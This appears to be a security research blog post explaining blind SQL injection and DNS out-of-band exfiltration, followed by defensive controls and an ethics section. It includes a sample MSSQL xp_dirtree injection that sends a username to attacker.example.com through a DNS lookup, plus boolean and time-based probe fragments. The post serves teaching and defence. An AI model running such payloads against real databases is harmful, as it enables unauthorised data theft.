---
title: "Blind SQL Injection and Out-of-Band Exfiltration: DNS as a Covert Channel"
date: 2026-06-30 16:45:00 +0300
categories: [Security Research]
tags: [sqli, oob, dns-exfiltration, web-security]
pin: false
---

## Summary

**Blind SQL injection** occurs when an application is vulnerable to SQLi but **does not reflect query results** in HTTP responses. Attackers infer truth via timing, boolean page differences, or **out-of-band (OOB)** channels. This research note focuses on **DNS-based OOB exfiltration**—documented in [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) and widely used in tools such as **sqlmap** (`--dns-domain`).

## When blind inference is required

Typical blind scenarios:

- Generic error pages with no data leak.
- INSERT/UPDATE-only endpoints.
- Second-order injection where results appear elsewhere.

**Boolean blind** asks true/false questions (`AND SUBSTRING(password,1,1)='a'`). **Time blind** uses `SLEEP()` or DB-specific delays. **OOB blind** triggers the database to **initiate outbound network I/O** carrying attacker-controlled substrings.

## DNS exfiltration mechanics (conceptual)

On **Microsoft SQL Server**, `xp_dirtree`, `OPENROWSET`, or `fn_get_dns` patterns have appeared in public exploit write-ups. On **Oracle**, `UTL_HTTP` / `UTL_INADDR.get_host_address` can resolve attacker domains. **MySQL** `LOAD_FILE()` with UNC paths can leak NTLM metadata on Windows (different class—see [OWASP UNC Path injection notes](https://owasp.org/www-community/attacks/UNC_Path)).

A simplified *conceptual* MSSQL DNS leak (lab only):

```sql
'; EXEC master..xp_dirtree '\\' + (SELECT TOP 1 username FROM users) + '.attacker.example.com\share';--
```

When the DB resolves `user1.attacker.example.com`, the attacker's authoritative DNS logs the label **`user1`**.

Tools automate this: [sqlmap DNS exfiltration documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage#dns-domain-exfiltration) describes `--dns-domain` requirements (attacker-controlled zone, direct connection to port 53).

## Defensive controls

| Control | Rationale |
| ------- | --------- |
| Parameterized queries | Removes injection primitive |
| Egress filtering from DB tier | Blocks OOB even if SQLi exists |
| Disable dangerous extended procedures | Reduce MSSQL gadget surface |
| WAF / query allowlisting | Defense in depth (not sole fix) |
| DNS monitoring | Alert on high-entropy subdomain labels from DB subnets |

## Ethics and legal scope

OOB exfiltration against systems **without authorization** violates computer misuse laws in most jurisdictions. This material is for **defensive architecture**, **CTF labs**, and **authorized penetration tests**.

## References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [sqlmap wiki — DNS exfiltration](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
